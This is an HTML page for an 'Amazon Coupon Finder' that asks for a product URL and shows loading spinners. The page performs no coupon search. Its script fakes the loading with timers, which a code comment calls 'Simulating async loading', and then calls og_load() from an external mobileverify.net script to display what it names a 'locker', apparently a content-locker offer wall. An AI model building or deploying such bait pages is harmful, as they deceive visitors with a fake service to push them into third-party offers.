<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Coupon Finder</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <script defer data-domain="onistream.com/amazon" src="https://plausible.io/js/script.js"></script>
    <script type="text/javascript" id="ogjs" src="https://mobileverify.net/cl/js/996d2w"></script>

    <style>
        body,
        html {
            margin: 0;
            padding: 0;
            font-family: 'Roboto', sans-serif;
            background-color: #f8f9fa;
            display: flex;
            flex-direction: column;
            justify-content: center;
            height: 100vh;
            text-align: center;
        }

        .main-content {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            margin: 20px auto;
        }

        .search-box {
            margin-top: 20px;
        }

        .search-input {
            width: calc(100% - 40px);
            max-width: 500px;
            padding: 15px;
            border: none;
            border-bottom: 2px solid #4caf50;
            background-color: #f8f9fa;
            font-size: 16px;
            margin: 0 auto;
            border-radius: 5px;
            outline: none;
        }

        .button {
            padding: 10px 20px;
            border-radius: 20px;
            border: none;
            background-color: #4caf50;
            color: white;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            outline: none;
        }

        .footer {
            padding: 20px 10px;
            background-color: #f2f2f2;
            color: #525252;
            font-size: 12px;
        }

        #loading {
            display: none;
            margin-top: 20px;
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-radius: 50%;
            border-top: 4px solid #4caf50;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: auto;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .coupon-box {
            display: none;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: calc(100% - 40px);
            max-width: 500px;
            margin: 20px auto;
        }

        .coupon-message {
            color: #333;
            margin-bottom: 20px;
            font-weight: bold;
        }
    </style>
</head>

<body>

    <div class="main-content">
        <div class="logo">
            <img src="logo.png" alt="Website Logo" style="max-width: 400px;">
        </div>

        <div class="search-box">
            <input type="text" class="search-input" placeholder="Enter Amazon product URL" id="searchInput">
            <button class="button" onclick="findCoupon()">Find Coupon</button>
        </div>

        <div id="loading" class="search-box">
            <div class="loader"></div>
        </div>

        <div id="couponBox" class="coupon-box">
            <div class="coupon-message">Please Wait...</div>
            <div class="separator"></div>
            <div id="captchaLoad" class="search-box">
                <div class="loader"></div>
            </div>
            <div class="captcha-section" style="display:none"><!-- Placeholder --></div>
        </div>
    </div>

    <div class="footer">
        Privacy Policy | ToS | Support<br>Elfinite, 2024 All rights reserved
    </div>

    <script>
        function findCoupon() {
            const searchInput = document.getElementById('searchInput');
            if (searchInput.value.trim() === '') {
                alert("Please enter an Amazon product URL");
                return;
            }

            document.getElementById('loading').style.display = 'block';
            document.getElementById('couponBox').style.display = 'none';

            // Simulating async loading
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('couponBox').style.display = 'block';
                document.getElementById('captchaLoad').style.display = 'block';
                setTimeout(() => {
                    displayLocker();
                }, 3000); // Adjust loading time
            }, 3000);
        }

        function displayLocker() {
            document.getElementById('captchaLoad').style.display = 'none';
            og_load(); // Call the function to show the locker
        }
    </script>

</body>

</html>
